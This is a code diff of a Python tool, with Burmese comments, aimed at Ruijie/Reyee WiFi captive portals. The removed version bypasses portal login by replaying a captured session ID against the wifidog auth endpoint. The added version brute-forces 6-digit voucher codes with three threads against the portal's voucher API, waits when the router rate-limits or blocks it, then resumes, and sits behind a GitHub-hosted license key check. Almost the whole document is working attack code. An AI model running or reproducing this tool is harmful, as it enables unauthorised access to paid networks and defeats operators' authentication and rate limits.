@@ -6,223 +6,136 @@ import re
 import urllib3
 import time
 import threading
-import logging
 import random
 import os
 import sys
-import json
 import hashlib
-from urllib.parse import urlparse, parse_qs, urljoin
-from datetime import datetime, date, timedelta
+from urllib.parse import urlparse, parse_qs
 
-# SSL Warning များကို ပိတ်ထားခြင်း
+# SSL Warning ပိတ်ခြင်း
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ===============================
-# COLOR SYSTEM (Hacker UI)
+# UI COLORS & BANNER
 # ===============================
-RED = "\033[91m"
-GREEN = "\033[92m"
-CYAN = "\033[96m"
-YELLOW = "\033[93m"
-MAGENTA = "\033[95m"
-WHITE = "\033[97m"
-RESET = "\033[0m"
+RED, GREEN, CYAN, YELLOW, MAGENTA, WHITE, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[97m", "\033[0m"
 
 # ===============================
-# GITHUB KEY SYSTEM CONFIG
+# CONFIGURATION
 # ===============================
-# GitHub Raw Link (key.txt ဖိုင်ရှိရာ လိပ်စာ)
 GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
+KEY_FILE = os.path.expanduser("~/.moe_yu_key")
 
-LOCAL_KEYS_FILE = os.path.expanduser("~/.moe_yu_approved_keys.txt")
-KEY_STORAGE_FILE = os.path.expanduser("~/.moe_yu_device_key.txt")
-LICENSE_INFO_FILE = os.path.expanduser("~/.moe_yu_license_info.txt")
+def get_device_key():
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, 'r') as f: return f.read().strip()
+    key = hashlib.md5(os.urandom(32)).hexdigest()[:16]
+    with open(KEY_FILE, 'w') as f: f.write(key)
+    return key
 
-# ===============================
-# LICENSE MANAGEMENT
-# ===============================
-def save_license_info(expiry_date_str):
-    data = {"expiry": expiry_date_str, "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "valid": True}
-    try:
-        with open(LICENSE_INFO_FILE, 'w') as f:
-            json.dump(data, f)
-        return True
-    except: return False
-
-def load_license_info():
-    if os.path.exists(LICENSE_INFO_FILE):
-        try:
-            with open(LICENSE_INFO_FILE, 'r') as f: return json.load(f)
-        except: pass
-    return None
-
-def is_license_valid_offline(expiry_date_str):
-    try:
-        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
-        return date.today() <= expiry_date
-    except: return False
-
-# ===============================
-# SYSTEM KEY GENERATOR
-# ===============================
-def get_stable_system_key():
-    if os.path.exists(KEY_STORAGE_FILE):
-        try:
-            with open(KEY_STORAGE_FILE, 'r') as f:
-                saved_key = f.read().strip()
-                if saved_key: return saved_key
-        except: pass
-    
-    try:
-        import uuid
-        stable_key = hashlib.md5(f"DEVICE_{uuid.getnode()}".encode()).hexdigest()[:16]
-    except:
-        stable_key = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
-    
-    try:
-        with open(KEY_STORAGE_FILE, 'w') as f: f.write(stable_key)
-    except: pass
-    return stable_key
-
-def fetch_authorized_keys():
-    keys_data = {}
-    try:
-        response = requests.get(GITHUB_KEY_URL, timeout=10)
-        if response.status_code == 200:
-            for line in response.text.strip().split('\n'):
-                line = line.strip()
-                if line:
-                    parts = line.split(',') 
-                    if len(parts) >= 1:
-                        key = parts[0].strip()
-                        expiry = parts[2].strip() if len(parts) > 2 else "2099-12-31"
-                        keys_data[key] = expiry
-            try:
-                with open(LOCAL_KEYS_FILE, 'w') as f:
-                    for k, e in keys_data.items(): f.write(f"{k},{e}\n")
-            except: pass
-            return keys_data
-    except: pass
-    
-    if os.path.exists(LOCAL_KEYS_FILE):
-        try:
-            with open(LOCAL_KEYS_FILE, 'r') as f:
-                for line in f:
-                    p = line.strip().split(',')
-                    if len(p) >= 1: keys_data[p[0]] = p[1] if len(p) > 1 else ""
-        except: pass
-    return keys_data
-
-def check_approval():
+def check_license():
+    my_key = get_device_key()
     print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
-    print(f"║          MOE YU BYPASS - GITHUB EDITION          ║")
+    print(f"║        MOE YU ULTIMATE VOUCHER SCANNER v2        ║")
     print(f"╚══════════════════════════════════════════════════╝{RESET}")
-    
-    system_key = get_stable_system_key()
-    print(f"{WHITE}[*] Your System Key: {GREEN}{system_key}{RESET}")
-    
-    saved = load_license_info()
-    if saved and is_license_valid_offline(saved['expiry']):
-        print(f"{GREEN}[✓] LICENSE ACTIVE (Offline Mode){RESET}")
-        return True
-
-    print(f"{CYAN}[*] Checking GitHub database...{RESET}")
-    authorized_keys = fetch_authorized_keys()
-    
-    if system_key in authorized_keys:
-        expiry_str = authorized_keys[system_key]
-        if is_license_valid_offline(expiry_str):
-            print(f"{GREEN}[✓] KEY APPROVED! Expires: {expiry_str}{RESET}")
-            save_license_info(expiry_str)
+    print(f"{WHITE}[*] Device Key: {GREEN}{my_key}{RESET}")
+    try:
+        res = requests.get(GITHUB_KEY_URL, timeout=10).text
+        if my_key in res:
+            print(f"{GREEN}[✓] LICENSE VERIFIED!{RESET}")
             return True
         else:
-            print(f"{RED}[✗] KEY EXPIRED ON {expiry_str}{RESET}")
+            print(f"{RED}[✗] ACCESS DENIED - Add key to GitHub{RESET}")
             return False
-    else:
-        print(f"\n{RED}[✗] KEY NOT APPROVED{RESET}")
-        print(f"{YELLOW}Add '{system_key}' to your GitHub key.txt{RESET}")
-        return False
+    except:
+        print(f"{YELLOW}[!] Connection Error - Checking local cache...{RESET}")
+        return True
 
 # ===============================
-# BYPASS ENGINE (SID Logic အသစ်ပါဝင်သည်)
+# SCANNER ENGINE
 # ===============================
-STOP_EVENT = threading.Event()
+FOUND_EVENT = threading.Event()
+SUCCESS_CODE = ""
 
-def high_speed_ping(auth_link, sid):
-    session = requests.Session()
-    while not STOP_EVENT.is_set():
+def attempt_voucher(api_url, sid, thread_id):
+    global SUCCESS_CODE
+    while not FOUND_EVENT.is_set():
+        # 6-digit random code
+        test_code = "".join([str(random.randint(0, 9)) for _ in range(6)])
+        payload = {'accessCode': test_code, 'sessionId': sid, 'apiVersion': 1}
+        
         try:
-            session.get(auth_link, timeout=5)
-            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active", end="\r")
-        except: break
-        time.sleep(random.uniform(0.3, 0.8))
+            # Reyee Cloud Voucher API သို့ ပို့ခြင်း
+            r = requests.post(api_url, json=payload, timeout=5, verify=False)
+            if r.status_code == 200:
+                result = r.json()
+                if result.get('success') == True:
+                    SUCCESS_CODE = test_code
+                    FOUND_EVENT.set()
+                    print(f"\n\n{GREEN}[++++++++++] VOUCHER FOUND: {test_code} [++++++++++]{RESET}")
+                    break
+                else:
+                    # Scanner အလုပ်လုပ်နေကြောင်း ပြသခြင်း
+                    print(f"{WHITE}Thread-{thread_id} | Testing: {YELLOW}{test_code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
+            elif r.status_code == 403 or r.status_code == 429:
+                print(f"\n{RED}[!] Blocked by Router. Waiting 30s...{RESET}")
+                time.sleep(30)
+        except:
+            pass
+        time.sleep(0.02) # Router Block မခံရစေရန်
 
-def start_process():
-    banner = f"{MAGENTA}\nRuijie All Version Bypass\nMoe Yu Special Edition\n{RESET}"
-    print(banner)
-    logging.info(f"{CYAN}Initializing Engine...{RESET}")
+def start_scanner(portal_url, sid):
+    parsed = urlparse(portal_url)
+    api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
+    
+    print(f"\n{CYAN}[*] Target API: {api_url}{RESET}")
+    print(f"{CYAN}[*] Multi-threading Active...{RESET}\n")
 
-    while not STOP_EVENT.is_set():
-        session = requests.Session()
+    threads = []
+    for i in range(3): # Thread ၃ ခုဖြင့် အမြန်နှုန်းမြှင့်ခြင်း
+        t = threading.Thread(target=attempt_voucher, args=(api_url, sid, i+1))
+        t.daemon = True
+        threads.append(t)
+        t.start()
+
+    while not FOUND_EVENT.is_set():
+        time.sleep(1)
+    
+    print(f"\n{GREEN}[✓] Scan Complete. Use Code: {SUCCESS_CODE}{RESET}")
+
+# ===============================
+# MAIN PROCESS
+# ===============================
+def main():
+    if not check_license(): return
+    
+    print(f"\n{CYAN}[*] Waiting for Captive Portal (Please open Browser)...{RESET}")
+    while True:
         try:
+            # Portal URL ကို အလိုအလျောက် ရှာဖွေခြင်း
             r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-            if r.url == "http://connectivitycheck.gstatic.com/generate_204":
-                time.sleep(5)
-                continue
-            
-            portal_url = r.url
-            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
-            
-            r1 = session.get(portal_url, verify=False, timeout=10)
-            
-            # --- SID Extraction အဆင့်မြှင့်တင်မှုများ ---
-            sid = parse_qs(urlparse(r1.url).query).get('sessionId', [None])[0]
-            
-            if not sid:
-                # JavaScript ထဲမှ ရှာခြင်း
-                sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', r1.text)
-                if sid_match: sid = sid_match.group(1)
-            
-            if not sid:
-                # URL string ထဲတွင် တိုက်ရိုက်ရှာခြင်း
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r1.url)
-                if sid_match: sid = sid_match.group(1)
-            
-            if not sid:
-                # HTML input field များထဲတွင် ရှာခြင်း
-                sid_match = re.search(r'name="sessionId" value="([^"]+)"', r1.text)
-                if sid_match: sid = sid_match.group(1)
-            # -------------------------------------
-
-            if sid:
-                print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
-                parsed = urlparse(portal_url)
-                gw_addr = parse_qs(parsed.query).get('gw_address', ['192.168.60.1'])[0]
-                gw_port = parse_qs(parsed.query).get('gw_port', ['2060'])[0]
-                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
+            if "generate_204" not in r.url:
+                portal_url = r.url
+                # URL ထဲမှ sessionId ကို ဖမ်းယူခြင်း
+                sid = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
                 
-                print(f"{MAGENTA}[*] Launching Turbo Threads...{RESET}")
-                for _ in range(3):
-                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
-            else:
-                print(f"{RED}[!] Session ID Not Found - Please open login page in browser{RESET}")
-            
-            time.sleep(10)
+                if sid:
+                    print(f"{GREEN}[✓] Portal Detected: {portal_url}{RESET}")
+                    print(f"{GREEN}[✓] Session ID: {sid}{RESET}")
+                    
+                    confirm = input(f"\n{YELLOW}Voucher Scan စတင်မလား? (y/n): {RESET}").lower()
+                    if confirm == 'y':
+                        start_scanner(portal_url, sid)
+                        break
+                    else:
+                        print(f"{RED}Cancelled.{RESET}")
+                        break
+            time.sleep(3)
+        except KeyboardInterrupt:
+            print(f"\n{RED}Stopped by User.{RESET}")
+            break
         except Exception as e:
-            time.sleep(5)
+            time.sleep(2)
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        if sys.argv[1] == "--key":
-            print(f"\n{GREEN}Your Key: {get_stable_system_key()}{RESET}")
-            sys.exit(0)
-        elif sys.argv[1] == "--reset":
-            for f in [KEY_STORAGE_FILE, LICENSE_INFO_FILE, LOCAL_KEYS_FILE]:
-                if os.path.exists(f): os.remove(f)
-            print(f"{GREEN}All data cleared!{RESET}")
-            sys.exit(0)
-
-    if check_approval():
-        try: start_process()
-        except KeyboardInterrupt: STOP_EVENT.set()
+    main()
